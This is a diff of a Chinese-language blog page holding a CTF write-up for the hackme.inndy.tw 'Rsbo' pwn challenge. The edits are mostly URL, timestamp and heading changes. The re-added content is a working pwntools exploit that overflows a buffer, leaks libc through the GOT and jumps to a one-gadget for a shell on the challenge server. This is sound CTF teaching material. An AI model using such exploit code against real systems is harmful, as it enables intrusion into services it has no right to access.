@@ -23,17 +23,17 @@
   <meta name="description" content="hackme.inndy.tw Rsbo(&amp;Rsbo 2) (pwn)challengeTips: ROP, open, read 保護機制NX開啟，Partial RELRO 分析main的邏輯:1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **e">
 <meta property="og:type" content="article">
 <meta property="og:title" content="hackme.inndy.tw Rsbo Writeup">
-<meta property="og:url" content="https://wh00am1.github.io/hackme-inndy-tw-Rsbo-Writeup/index.html">
+<meta property="og:url" content="https://wh00am1.github.io/archives/hackme-inndy-tw-Rsbo-Writeup/index.html">
 <meta property="og:site_name" content="Wh0am1&#39;s Blog">
 <meta property="og:description" content="hackme.inndy.tw Rsbo(&amp;Rsbo 2) (pwn)challengeTips: ROP, open, read 保護機制NX開啟，Partial RELRO 分析main的邏輯:1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **e">
 <meta property="og:locale" content="zh_TW">
 <meta property="article:published_time" content="2020-10-15T12:53:03.000Z">
-<meta property="article:modified_time" content="2020-10-15T13:14:21.262Z">
+<meta property="article:modified_time" content="2020-10-15T13:22:57.428Z">
 <meta property="article:author" content="wh0am1">
 <meta property="article:tag" content="CTF, pwn">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://wh00am1.github.io/hackme-inndy-tw-Rsbo-Writeup/">
+<link rel="canonical" href="https://wh00am1.github.io/archives/hackme-inndy-tw-Rsbo-Writeup/">
 
 
 <script id="page-configurations">
@@ -152,7 +152,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
-    <link itemprop="mainEntityOfPage" href="https://wh00am1.github.io/hackme-inndy-tw-Rsbo-Writeup/">
+    <link itemprop="mainEntityOfPage" href="https://wh00am1.github.io/archives/hackme-inndy-tw-Rsbo-Writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -176,7 +176,7 @@
               <span class="post-meta-item-text">發表於</span>
               
 
-              <time title="創建時間：2020-10-15 20:53:03 / 修改時間：21:14:21" itemprop="dateCreated datePublished" datetime="2020-10-15T20:53:03+08:00">2020-10-15</time>
+              <time title="創建時間：2020-10-15 20:53:03 / 修改時間：21:22:57" itemprop="dateCreated datePublished" datetime="2020-10-15T20:53:03+08:00">2020-10-15</time>
             </span>
 
           
@@ -212,8 +212,7 @@
 <p>因為ASLR, NX 的關係, 需要想辦法ROP</p>
 <p>但binary太小, 組不起ROP chain, 因此使用libc</p>
 <p>只要Leak GOT, 接著就可以算出libc base &amp; getshell了</p>
-<p>exploit:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;rsbo&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;hackme.inndy.tw&#x27;</span>, <span class="number">7706</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;rsbo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so.i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stage 1 (leak read)</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">108</span></span><br><span class="line">payload += p32(e.symbols[<span class="string">&#x27;write&#x27;</span>]) + p32(e.symbols[<span class="string">&#x27;_start&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[+]Libc base at: &#123;&#125;&#x27;</span>.format(hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">108</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x5faa5</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit:"></a>exploit:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;rsbo&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;hackme.inndy.tw&#x27;</span>, <span class="number">7706</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;rsbo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so.i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stage 1 (leak read)</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">108</span></span><br><span class="line">payload += p32(e.symbols[<span class="string">&#x27;write&#x27;</span>]) + p32(e.symbols[<span class="string">&#x27;_start&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[+]Libc base at: &#123;&#125;&#x27;</span>.format(hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">108</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x5faa5</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
 
 <p>p.s. shell連上去之後可以拿到2個 Flag (直接Double Kill XD)</p>
 
@@ -289,7 +288,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hackme-inndy-tw-Rsbo-amp-Rsbo-2-pwn"><span class="nav-number">1.</span> <span class="nav-text">hackme.inndy.tw Rsbo(&amp;Rsbo 2) (pwn)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#challenge"><span class="nav-number">1.1.</span> <span class="nav-text">challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6"><span class="nav-number">1.2.</span> <span class="nav-text">保護機制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main%E7%9A%84%E9%82%8F%E8%BC%AF"><span class="nav-number">1.3.1.</span> <span class="nav-text">main的邏輯:</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hackme-inndy-tw-Rsbo-amp-Rsbo-2-pwn"><span class="nav-number">1.</span> <span class="nav-text">hackme.inndy.tw Rsbo(&amp;Rsbo 2) (pwn)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#challenge"><span class="nav-number">1.1.</span> <span class="nav-text">challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6"><span class="nav-number">1.2.</span> <span class="nav-text">保護機制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main%E7%9A%84%E9%82%8F%E8%BC%AF"><span class="nav-number">1.3.1.</span> <span class="nav-text">main的邏輯:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">1.4.</span> <span class="nav-text">exploit:</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
